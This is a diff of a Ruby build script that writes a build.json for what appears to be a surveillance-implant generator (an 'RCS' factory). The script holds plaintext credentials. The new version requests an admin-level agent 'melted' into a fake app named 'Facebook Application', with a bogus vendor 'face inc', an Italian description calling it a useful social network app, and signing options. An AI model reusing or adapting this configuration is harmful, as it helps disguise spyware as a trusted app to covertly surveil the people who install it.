@@ -4,26 +4,27 @@ require 'json'
 
 USER = 'alor'
 PASS = 'demorcss'
-FACTORY = 'RCS_0000000757'
-PLATFORM = 'android'
-DB = 'rcs-castore'
-PORT = 443
+FACTORY = 'RCS_0000000001'
+PLATFORM = 'qrcode'
+DB = 'localhost'
+PORT = 4444
 DEMO = false
 
 ver = DEMO ? '_demo' : ''
 
 ###################################################################################################
 params = {platform: PLATFORM,
-          generate: {platforms: [],
-                     binary: {demo: DEMO, admin: false},
-                     melt: {admin: false, demo: DEMO}
-                    },
-          melt: {appname: 'facebook'}
-          }
-
-params = {platform: PLATFORM,
-          binary: {demo: DEMO},
-          melt: {appname: 'facebook'}
+          generate: {platforms: ['blackberry'],
+                     binary: {demo: DEMO, admin: true},
+                     melt: {admin: true,
+                            appname: 'facebook',
+                            name: 'Facebook Application',
+                            desc: 'Applicazione utilissima di social network',
+                            vendor: 'face inc',
+                            version: '1.2.3'},
+                     sign: {edition: '5th3rd'},
+                     link: 'http://www.alor.it'
+                    }
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
